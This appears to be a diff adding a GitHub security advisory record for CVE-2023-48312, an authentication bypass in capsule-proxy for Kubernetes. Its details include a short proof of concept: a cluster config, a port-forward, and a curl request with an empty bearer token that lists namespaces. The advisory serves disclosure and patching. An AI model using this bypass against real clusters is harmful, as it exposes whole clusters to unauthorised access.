@@ -1,0 +1,90 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-fpvw-6m5v-hqfp",
+  "modified": "2023-11-27T22:07:37Z",
+  "published": "2023-11-24T16:53:25Z",
+  "aliases": [
+    "CVE-2023-48312"
+  ],
+  "summary": "Capsule Proxy Authentication bypass using an empty token",
+  "details": "The privilege escalation is based on a missing check if the user is authenticated based on the `TokenReview` result.\n\nAll the clusters running with the `anonymous-auth` Kubernetes API Server setting disable (set to `false`) are affected since it would be possible to bypass the token review mechanism, interacting with the upper Kubernetes API Server.\n\n# PoC\n\nStart a KinD cluster with the `anonymous-auth` value to `false`. \nIf it is true, it uses anonymous permissions which are very limited by default\n\n```yaml\nkind: Cluster\napiVersion: kind.x-k8s.io/v1alpha4\nnodes:\n- role: control-plane\n  kubeadmConfigPatches:\n  - |\n    kind: ClusterConfiguration\n    apiServer:\n        extraArgs:\n          anonymous-auth: \"false\"\n```\n\nInstall `capsule` and `capsule-proxy`\n\n```\nk port-forward svc/capsule-proxy 9001    \nForwarding from 127.0.0.1:9001 -> 9001\nForwarding from [::1]:9001 -> 9001\nHandling connection for 9001\n```\n\nThen query the proxy\n```\ncurl -g -k -H 'Authorization: Bearer   f' -X 'GET' 'https://localhost:9001/api/v1/namespaces'\n```\n\n# Impact\n\nThe whole cluster is exposed to unauthorised users.\n\nThis privilege escalation cannot be exploited if you're relying only on client certificates (SSL/TLS).",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/projectcapsule/capsule-proxy"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.4.6"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "<= 0.4.5"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/clastix/capsule-proxy"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.4.6"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "<= 0.4.5"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/projectcapsule/capsule-proxy/security/advisories/GHSA-fpvw-6m5v-hqfp"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-48312"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/projectcapsule/capsule-proxy/commit/472404f7006a4152e4eec76dee07324dd1e6e823"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/projectcapsule/capsule-proxy"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-287"
+    ],
+    "severity": "CRITICAL",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-11-24T16:53:25Z",
+    "nvd_published_at": "2023-11-24T18:15:07Z"
+  }
+}
